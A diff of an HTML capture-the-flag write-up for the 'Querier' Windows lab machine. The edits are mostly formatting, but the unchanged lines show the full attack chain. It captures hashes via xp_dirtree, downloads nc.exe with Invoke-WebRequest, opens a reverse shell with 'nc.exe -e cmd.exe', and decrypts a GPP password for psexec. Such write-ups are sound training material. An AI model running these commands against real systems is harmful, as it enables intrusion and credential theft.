@@ -77,13 +77,13 @@
 
 <h2 id="quick-summary">Quick Summary</h2>
 <p><br> Hey guys today Querier retired and here’s my write-up about it. It was a great windows machine covering some interesting stuff and I enjoyed it.I wrote two posts for this machine, first one solving it with kali and the other one solving it with commando vm, you can find the second post <a href="/hack-the-box/querier-2/">here</a>. It’s a Windows box and its ip is <code class="highlighter-rouge">10.10.10.125</code>, I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">querier.htb</code>. Let’s jump right in!
-<img src="/images/hackthebox/querier/0.png" alt=""></p>
+<br><img src="/images/hackthebox/querier/0.png" alt=""><br></p>
 <hr>
 
 <h2 id="nmap">Nmap</h2>
 <p><br> As always we will start with <code class="highlighter-rouge">nmap</code> to scan for open ports and services :
-<code class="highlighter-rouge">nmap -sV -sT -sC querier.htb</code>
-<img src="/images/hackthebox/querier/1.png" alt="">
+<br><code class="highlighter-rouge">nmap -sV -sT -sC querier.htb</code>
+<br><img src="/images/hackthebox/querier/1.png" alt=""><br>
 <br> We got <code class="highlighter-rouge">smb</code> and <code class="highlighter-rouge">mssql</code> server on port 1433. Let’s check <code class="highlighter-rouge">smb</code>.
 <br></p>
 <hr>
@@ -127,9 +127,9 @@ Currency Volume Report.xlsm: Microsoft Excel 2007+
 
 <h2 id="mssql-credentials-from-reportxlsm">MSSQL Credentials from Report.xlsm</h2>
 <p><br> I checked the contents of the excel file by just viewing it as it will be opened with the archive manager :
-<img src="/images/hackthebox/querier/2.png" alt="">
+<br><img src="/images/hackthebox/querier/2.png" alt=""><br>
 <br> in <code class="highlighter-rouge">xl</code> I found <code class="highlighter-rouge">vbaProject.bin</code> so I used <code class="highlighter-rouge">olevba</code> from <a href="https://www.decalage.info/python/oletools" target="_blank" rel="noopener noreferrer"><code class="highlighter-rouge">oletools</code></a> to see if I can get anything :
-<img src="/images/hackthebox/querier/3.png" alt=""></p>
+<br><img src="/images/hackthebox/querier/3.png" alt=""><br></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/querier# olevba Currency\ Volume\ Report.xlsm 
 olevba 0.54.2 on Python 2.7.16 - http://decalage.info/python/oletools
 ===============================================================================
@@ -197,7 +197,7 @@ Password:
 [-] ERROR(QUERIER): Line 1: Login failed for user 'reporting'.
 </code></pre></div></div>
 <p><br> I added the windows authentication option (<code class="highlighter-rouge">-windows-auth</code>) and it worked :
-<img src="/images/hackthebox/querier/4.png" alt="">
+<br><img src="/images/hackthebox/querier/4.png" alt=""><br>
 <br> Unfortunately … permission denied for <code class="highlighter-rouge">xp_cmdshell</code> :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL&gt; enable_xp_cmdshell
 [-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.
@@ -206,10 +206,8 @@ Password:
 [-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
 </code></pre></div></div>
 <p><br> I ran <code class="highlighter-rouge">responder</code> (<code class="highlighter-rouge">responder -I tun0</code>) and used <code class="highlighter-rouge">xp_dirtree</code> to see what hashes can I catch :
-<img src="/images/hackthebox/querier/5.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/querier/6.png" alt=""></p>
+<br><img src="/images/hackthebox/querier/5.png" alt=""><br>
+<br><img src="/images/hackthebox/querier/6.png" alt=""><br></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] Listening for events...
 [SMBv2] NTLMv2-SSP Client   : 10.10.10.125
 [SMBv2] NTLMv2-SSP Username : QUERIER\mssql-svc
@@ -234,10 +232,8 @@ Use the "--show --format=netntlmv2" options to display all of the cracked passwo
 Session completed
 </code></pre></div></div>
 <p><br> Now it’s time to enable <code class="highlighter-rouge">xp_cmdshell</code> and get a reverse shell. 
-<img src="/images/hackthebox/querier/7.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/querier/8.png" alt="">
+<br><img src="/images/hackthebox/querier/7.png" alt=""><br>
+<br><img src="/images/hackthebox/querier/8.png" alt=""><br>
 <br> We have <code class="highlighter-rouge">RCE</code>. I ran a python server to host <code class="highlighter-rouge">nc.exe</code> then I used <code class="highlighter-rouge">Invoke-WebRequest</code> to download it :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL&gt; EXEC xp_cmdshell 'powershell.exe Invoke-WebRequest -o C:\Users\mssql-svc\appdata\local\temp\nc.exe http://10.10.xx.xx/nc.exe'
 output                                                                                                                                                                                                                                                            
@@ -247,17 +243,17 @@ NULL
 <p><br> Then I got a reverse shell :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>EXEC xp_cmdshell 'C:\Users\mssql-svc\appdata\local\temp\nc.exe -e cmd.exe 10.10.xx.xx 1337'
 </code></pre></div></div>
-<p><img src="/images/hackthebox/querier/9.png" alt="">
+<p><br><img src="/images/hackthebox/querier/9.png" alt=""><br>
 <br> We owned user !
 <br></p>
 <hr>
 
 <h2 id="gpp-privilege-escalation-root-flag">GPP, Privilege Escalation, Root Flag</h2>
 <p><br> One of the things to check when enumerating Windows machines is group policy passwords which happened to be the privilege escalation vector here. I checked group policy passwords and found Administrator’s password :
-<img src="/images/hackthebox/querier/10.png" alt="">
-<img src="/images/hackthebox/querier/11.png" alt="">
+<br><img src="/images/hackthebox/querier/10.png" alt=""><br>
+<br><img src="/images/hackthebox/querier/11.png" alt=""><br>
 <br> <code class="highlighter-rouge">Groups.xml</code> :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span><span class="nt">&lt;Groups</span> <span class="na">clsid=</span><span class="s">"{3125E937-EB16-4b4c-9934-544FC6D24D26}"</span><span class="nt">&gt;</span>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span><span class="nt">&lt;Groups</span> <span class="na">clsid=</span><span class="s">"{3125E937-EB16-4b4c-9934-544FC6D24D26}"</span><span class="nt">&gt;</span>
 <span class="nt">&lt;User</span> <span class="na">clsid=</span><span class="s">"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"</span> <span class="na">name=</span><span class="s">"Administrator"</span> <span class="na">image=</span><span class="s">"2"</span> <span class="na">changed=</span><span class="s">"2019-01-28 23:12:48"</span> <span class="na">uid=</span><span class="s">"{CD450F70-CDB8-4948-B908-F8D038C59B6C}"</span> <span class="na">userContext=</span><span class="s">"0"</span> <span class="na">removePolicy=</span><span class="s">"0"</span> <span class="na">policyApplied=</span><span class="s">"1"</span><span class="nt">&gt;</span>
 <span class="nt">&lt;Properties</span> <span class="na">action=</span><span class="s">"U"</span> <span class="na">newName=</span><span class="s">""</span> <span class="na">fullName=</span><span class="s">""</span> <span class="na">description=</span><span class="s">""</span> <span class="na">cpassword=</span><span class="s">"CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ"</span> <span class="na">changeLogon=</span><span class="s">"0"</span> <span class="na">noChange=</span><span class="s">"0"</span> <span class="na">neverExpires=</span><span class="s">"1"</span> <span class="na">acctDisabled=</span><span class="s">"0"</span> <span class="na">userName=</span><span class="s">"Administrator"</span><span class="nt">&gt;&lt;/Properties&gt;&lt;/User&gt;&lt;/Groups&gt;</span>
 </code></pre></div></div>
@@ -269,7 +265,7 @@ MyUnclesAreMarioAndLuigi!!1!
 <p><br> Password is <code class="highlighter-rouge">MyUnclesAreMarioAndLuigi!!1!</code>. We can use it with <code class="highlighter-rouge">psexec.py</code> from <code class="highlighter-rouge">impacket</code> and get a shell as system :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>psexec.py Administrator:'MyUnclesAreMarioAndLuigi!!1!'@querier.htb
 </code></pre></div></div>
-<p><img src="/images/hackthebox/querier/12.png" alt="">
+<p><br><img src="/images/hackthebox/querier/12.png" alt=""><br>
 <br>  And we owned root !
 <br> That’s it , Feedback is appreciated !
 <br> Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
